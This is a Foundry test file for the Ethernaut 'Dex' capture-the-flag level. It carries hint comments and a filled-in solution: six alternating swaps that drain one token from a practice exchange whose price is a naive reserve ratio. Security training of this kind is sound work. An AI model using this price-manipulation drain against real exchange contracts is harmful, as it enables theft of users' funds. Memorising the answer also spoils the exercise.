// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {Dex, SwappableToken} from "../src/Dex.sol";
import {IERC20} from "openzeppelin-contracts-08/token/ERC20/IERC20.sol";

contract DexTest is Test {
    Dex public target;
    SwappableToken public token1;
    SwappableToken public token2;

    address public deployer = makeAddr("deployer"); // owns Dex, seeds liquidity
    address public attacker = makeAddr("attacker"); // Ethernaut player

    // Ethernaut-style amounts
    uint256 constant DEX_LIQUIDITY = 100;
    uint256 constant PLAYER_START = 10;

    function setUp() public {
        vm.startPrank(deployer);

        target = new Dex();
        // Mint supply to deployer (like the Ethernaut factory).
        token1 = new SwappableToken(address(target), "Token 1", "TKN1", DEX_LIQUIDITY + PLAYER_START);
        token2 = new SwappableToken(address(target), "Token 2", "TKN2", DEX_LIQUIDITY + PLAYER_START);

        target.setTokens(address(token1), address(token2));

        // Approve Dex to pull liquidity from deployer, then add 100 of each.
        token1.approve(address(target), DEX_LIQUIDITY);
        token2.approve(address(target), DEX_LIQUIDITY);
        target.addLiquidity(address(token1), DEX_LIQUIDITY);
        target.addLiquidity(address(token2), DEX_LIQUIDITY);

        // Give the player 10 of each token.
        token1.transfer(attacker, PLAYER_START);
        token2.transfer(attacker, PLAYER_START);

        vm.stopPrank();
    }

    function testExploit() public {
        // Win condition (Ethernaut):
        //   Drain all of at least one token from the Dex
        //   → balanceOf(token1, dex) == 0  OR  balanceOf(token2, dex) == 0
        //
        // Hints (look at Dex.sol carefully):
        //   - getSwapPrice is NOT constant-product; it's a simple ratio:
        //       amount_out = amount_in * balance(to) / balance(from)
        //   - Each swap changes the reserves, so the price drifts
        //   - With only 10+10 start, repeated swaps can empty one side
        //   - You must approve the Dex to spend your tokens first:
        //       target.approve(address(target), type(uint256).max);
        //     (Dex.approve sets allowance on both tokens for msg.sender → spender)
        //
        // Tip: swap back and forth, always swapping your full balance of one token
        //   (and be careful on the last swap — don't ask for more than the pool has).
        //
        // Example skeleton:
        //   target.approve(address(target), type(uint256).max);
        //   target.swap(token1, token2, amount);
        //   target.swap(token2, token1, amount);
        //   ...

        vm.startPrank(attacker);

        // ========== YOUR EXPLOIT HERE ==========
        target.approve(address(target), type(uint256).max);
        target.swap(address(token1), address(token2), 10);
        target.swap(address(token2), address(token1), 20);
        target.swap(address(token1), address(token2), 24);
        target.swap(address(token2), address(token1), 30);
        target.swap(address(token1), address(token2), 41);
        target.swap(address(token2), address(token1), 45);
        // ========== END EXPLOIT ==========

        vm.stopPrank();

        uint256 dexToken1 = target.balanceOf(address(token1), address(target));
        uint256 dexToken2 = target.balanceOf(address(token2), address(target));
        assertTrue(dexToken1 == 0 || dexToken2 == 0, "at least one token should be drained from the Dex");
    }
}
